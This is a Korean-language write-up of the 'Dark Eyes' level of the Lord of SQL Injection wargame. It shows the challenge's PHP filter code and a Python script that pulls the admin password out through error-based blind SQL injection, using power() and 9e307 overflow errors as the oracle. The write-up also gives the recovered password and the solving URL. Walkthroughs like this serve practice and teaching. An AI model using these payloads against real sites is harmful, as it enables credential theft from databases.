# Lord of SQL Injection No.22 Dark Eyes

Dark Eyes 문제는 여러 제약을 가지며 Error Based SQL Injection을 수행해볼 수 있도록 유도한 문제이다.

## 소스 코드
```php
<?php
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/col|if|case|when|sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(mysql_error()) exit();
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("dark_eyes");
  highlight_file(__FILE__);
?>
```

```php
if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
```

`$_GET` 방식으로 입력받은 `pw`값에 `prob`, `_`, `.`, `(`, `)`가 들어있으면 `No Hack ~_~`이 출력된 후 문제 풀이에 실패하게 된다.

```php
if(preg_match('/col|if|case|when|sleep|benchmark/i', $_GET[pw])) exit("HeHe");
```

`col`, `if`, `case`, `when`, `sleep`, `benchmark` 가 `pw` 값에 포함되면 `HeHe`를 출력한 후 문제 풀이에 실패하게 된다.

```php
if(mysql_error()) exit();
```

위의 조건절은 이전 문제였던 Iron Golem에서 처음 선보였던 조건절과 매우 흡사하지만 차이가 있다.

이전 문제에서는 "MySQL에서 오류가 발생하면 **에러를 출력한 후**에 종료한다" 라는 의미의 조건절이 있었지만, 위의 조건절은 아무 것도 출력하지 않고 `exit` 함수가 실행되기만 한다.

하지만, 이 조건절로도 무난하게 **Error Based SQL Injection** 공격이 가능하다.

#### 문제 풀이 조건

```php
if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("dark_eyes");
```

`$_GET` 방식으로 입력받은 `pw`값과 DB에 존재하는 `pw`값이 일치하면 문제 풀이에 성공하게 된다.

## Solution

21번 Iron Golem 문제에서는 `power`를 이용한 지수 연산 오류를 이용하여 문제를 해결했었다.

이번 문제에서는 `power` 함수 뿐만 아니라 지수 연산 최대치 값을 이용한 연산을 통해 문제를 해결할 것이다.

```python
import urllib.request
from urllib.parse import quote

result = ""

pwlen = 0

for i in range(0, 30):
    url = "http://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw="
    data = "' or id='admin' and power((length(pw)={})+1,99999999999999) -- ;".format(str(i))
    print(data)
    data = quote(data)
    re = urllib.request.Request(url + data)
    re.add_header("User-agent", "Mozilla/5.0")
    re.add_header("Cookie", "PHPSESSID=67rse542trun7sp0rtrd5pp612")
    res = urllib.request.urlopen(re)

    if str(res.read()).find("query :") == -1:
        pwlen = i
        print("Password Length is {} !!".format(pwlen))
        break

for i in range(1, pwlen + 1):
    for j in range(ord('0'), ord('z')):
        url = "http://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw="
        data = "' or id='admin' and (((substr(pw,{},1)='{}')+1)*9e307) -- ;".format(str(i), chr(j))
        print(data)
        data = quote(data)
        re = urllib.request.Request(url + data)
        re.add_header("User-agent", "Mozilla/5.0")
        re.add_header("Cookie", "PHPSESSID=67rse542trun7sp0rtrd5pp612")
        res = urllib.request.urlopen(re)

        if str(res.read()).find("query :") == -1:
            result += chr(j).lower()
            print(result)
            break
print("Password is [{}]!!".format(result))
```

```python
data = "' or id='admin' and power((length(pw)={})+1,99999999999999) -- ;".format(str(i))
```

`pwlen`은 `power`를 사용해서 구해볼 것이다.

위의 코드를 살펴보면 `length(pw)`에 일치하는 값이 매칭되면 1이 반환되기 때문에 1+1의 연산이 되고 결국 올바른 값이 매칭되면 `power(2,99999999999999)` 즉, 2^99999999999999라는 값이 들어가게 되어 에러를 내뿜는다.

소스 코드에서 MySQL에 오류가 생기면 에러를 출력하지 않고 빈 페이지로 이동하게 되기 때문에, 이를 이용하여 에러가 발생하지 않으면 항상 존재할 수 밖에 없는 `query :` 라는 문자열을 찾도록하여 올바른 값이 매칭되면 -1을 반환하도록 한다.

```python
if str(res.read()).find("query :") == -1:
        pwlen = i
        print("Password Length is {} !!".format(pwlen))
        break
```

올바른 값이 매칭되면 빈 페이지를 띄우기 때문에 `read` 함수에서의 반환값은 -1이다.

이를 이용하여 반환값이 -1일 때, 대입했던 값을 `pwlen`에 저장한 후 반복문을 탈출한다.

위의 코드를 실행하면 `pwlen`가 8이라는 것을 알 수 있다.

```python
data = "' or id='admin' and (((substr(pw,{},1)='{}')+1)*9e307) -- ;".format(str(i), chr(j))
```

`pw`의 값을 매칭시킬 때에는 `power` 함수 대신 **9e307**이라는 지수 연산 최대치를 이용했다.

MySQL에서는 e를 이용하여 지수 연산이 가능하다.

예를 들어, 3e3 이라고 하면 3*10³ 이 되는 것인데, MySQL에서는 9e307이 최대치라고 한다.
그렇기 때문에 `substr`로 자른 문자열이 대입한 값과 일치하게 되면 1을 반환하고, 1+1이 되기 때문에 올바른 값이 매칭될 때만 9e307 * 2를 반환하여 에러를 발생시킨 후 빈 페이지로 전환하게 된다.

반환값 -1을 이용하여 찾은 `pw` 값은 `5a2f5d3c`이기 때문에,

```
http://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw=5a2f5d3c
```

URL에 `pw` 값을 대입하면 문제 풀이에 성공하게 된다.